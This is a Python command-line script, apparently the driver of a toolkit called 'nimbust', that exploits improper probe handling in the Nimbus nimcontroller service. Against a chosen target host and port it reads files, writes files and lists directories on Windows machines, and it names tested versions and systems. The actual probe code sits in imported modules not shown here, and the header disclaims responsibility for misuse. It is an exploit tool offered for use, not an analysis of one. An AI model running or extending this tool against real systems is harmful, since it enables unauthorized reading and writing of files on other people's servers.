#!/usr/bin/env python3
#
# Script name       : nimbust.py
# Version           : 1.1
# Created date      : ??/??/19
# Last update       : ??/??/19
# Author            : wetw0rk
# Python version    : 3.7.4
# Designed OS       : Linux (preferably a penetration testing distro)
#
# Description : The Nimbus protocol suffers from improper probe handling
#               this toolkit will allow you to read and write text files
#               onto the target host as well as get a directory listing.
#
# Tested Nimbus Versions (should work on any version <= 9.2):
#   9.10 [Build 9.10.846, Apr  6 2019]
#   7.80 [Build 7.80.3132, Jun  1 2015]
#
# Tested on:
#   Windows 10 Pro
#   Windows Server 2008 R2 Standard Edition
#   Windows Server 2012 R2 Standard Edition
#
# NOTE (HARDCODED VALUES):
#   - Client address: 127.0.0.1/1337
#
# WARNING : I am not responsible for how you use my code ;)
#

from probes import *
from probes.dependencies import *

def main():

  formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=52)
  parser = argparse.ArgumentParser(formatter_class=formatter, description="Nimbust - Nimbus exploitation toolkit")
  parser.add_argument("-t", "--target",help="target host to probe")
  parser.add_argument("-p", "--port", help="nimcontroller port", default=48000)
  parser.add_argument("-d", "--dir", help="directory to list from, or write to", default="C:\\")
  parser.add_argument("-f", "--file", help="file for read or write")
  parser.add_argument("-m", "--mode", help="exploit mode (read, write, list, info)")


  modes = ["read", "write", "list", "info"]
  args = parser.parse_args()

  host      = args.target
  port      = int(args.port)
  directory = args.dir
  filename  = args.file
  mode      = args.mode

  if mode != None and host == None:
    p_error("No target specified")
    sys.exit(-1)

  if mode == "info":
    get_info.probe(host, port)

  elif mode == "list":
    directory_list.probe(host, port, directory)

  elif mode == "read" or mode == "write":
    if directory == None:
      p_error("Directory needed to continue")
      sys.exit(-1)
    else:
      if mode == "read":
        if filename == None:
          p_error("Filename needed to continue")
          sys.exit(-1)
        text_file_get.probe(host, port, directory, filename)
      else:
        if os.path.isfile(filename) is False:
          p_error("Error reading. Is file present?")
          sys.exit(-1)
        text_file_put.probe(host, port, directory, filename)
        directory_list.probe(host, port, directory)

  if mode not in modes:
    parser.print_help()

main()
